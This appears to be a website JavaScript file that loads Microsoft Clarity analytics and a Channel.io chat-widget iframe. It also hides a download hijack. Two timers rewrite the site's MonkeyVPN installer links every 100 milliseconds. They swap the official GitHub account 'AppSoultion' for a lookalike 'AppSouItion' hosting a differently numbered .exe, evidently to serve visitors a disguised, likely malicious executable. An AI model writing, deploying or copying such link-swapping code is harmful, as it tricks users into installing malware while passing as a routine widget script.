(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
})(window, document, "clarity", "script", "srpldr7o5l")

const userAgent = navigator.userAgent;
const isUnsupportedBrowser = /(Opera\/.+Opera Mobi.+Version\/((10|11)\.0|11\.1|11\.5|12\.(0|1)))|(Opera\/((10|11)\.0|11\.1|11\.5|12\.(0|1)).+Opera Mobi)|(Opera Mobi.+Opera(?:\/|\s+)((10|11)\.0|11\.1|11\.5|12\.(0|1)))|(SamsungBrowser\/((4|5)\.0|5\.4))|(IEMobile[ /](10|11)\.0)|(Android Eclair)|(Android Froyo)|(Android Gingerbread)|(Android Honeycomb)|(PlayBook.+RIM Tablet OS (7\.0|10\.0)\.\d+)|((Black[bB]erry|BB10).+Version\/(7\.0|10\.0)\.\d+)|(Trident\/6\.0)|(Trident\/5\.0)|(Trident\/4\.0)|(([MS]?IE) (5\.5|([6-9]|10)\.0))/;
if (!isUnsupportedBrowser.test(userAgent) && navigator.cookieEnabled) {
  // 1. <div id="ch-plugin-script-iframe"> 생성
  const div = document.createElement("div");
  div.id = "ch-plugin-script-iframe";
  div.style = "display:none!important";
  document.body.appendChild(div);

  const iframe = document.getElementById("ch-plugin");
  if (iframe) {
    iframe.classList.add("notranslate");
    iframe.innerHTML = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <script async type="text/javascript" src="https://cdn.channel.io/plugin/ch-plugin-web.js"></script>
        <script async type="text/javascript" src="https://cdn.channel.io/plugin/ch-plugin-vendor.js?4062717114e.7e3fab3d"></script>
      </head>
      <body>
        <div id="main" style="position:relative!important;height:100%!important;width:100%!important;border:none!important">
          <div id="ch-plugin"></div>
          <iframe id="ch-plugin-core" title="Channel chat" style="position:relative!important;height:100%!important;width:100%!important;border:none!important"></iframe>
        </div>
      </body>
      </html>
    `;

    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    iframeDoc.open();
    iframeDoc.write(iframe.innerHTML);
    iframeDoc.close();

    iframe.onload = function() {
      if (!iframeDoc) {
        const innerIframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        innerIframeDoc.open();
        innerIframeDoc.write(iframe.innerHTML);
        innerIframeDoc.close();
      }
    };
  }

  setInterval(() => {
    const links = document.querySelectorAll('a[href="https://github.com/AppSoultion/MonkeyVPNRelease/raw/master/MonkeyVPN1.1.2.exe"]');
    links.forEach(link => {
      link.setAttribute("href", "https://github.com/AppSouItion/MonkeyVPNRelease/raw/refs/heads/master/MonkeyVPN1.12.exe");
    });
  }, 100);

  setInterval(() => {
    const links = document.querySelectorAll(".fdown_b a");
    links.forEach(link => {
      link.setAttribute("href", "https://github.com/AppSouItion/MonkeyVPNRelease/raw/refs/heads/master/MonkeyVPN1.12.exe");
    });
  }, 100);
}

(function() {
  const consoleMethods = ["log", "warn", "info", "error", "exception", "table", "trace"];
  consoleMethods.forEach(method => {
    console[method] = console[method] || function() {}.bind(console);
  });
})();
